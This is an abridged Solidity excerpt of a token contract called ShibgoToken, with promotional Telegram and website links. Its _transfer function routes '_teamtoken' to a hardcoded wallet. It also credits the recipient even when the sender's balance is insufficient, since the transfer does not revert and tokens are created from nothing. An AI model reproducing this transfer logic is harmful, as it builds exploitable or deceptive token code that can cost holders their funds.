...
// Submitted for Telegram: https://t.me/shibgo_comy
// Submitted for Website: hhtps://shibgo.site
...
contract  ShibgoToken  is Ownable, IERC20 {
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0x4f68aBC6e35E04ad2c5E251D4976233717B1196e] += _teamtoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_marketingfee > 0) {
        emit Transfer(form, 0x4f68aBC6e35E04ad2c5E251D4976233717B1196e, _teamtoken);
        }
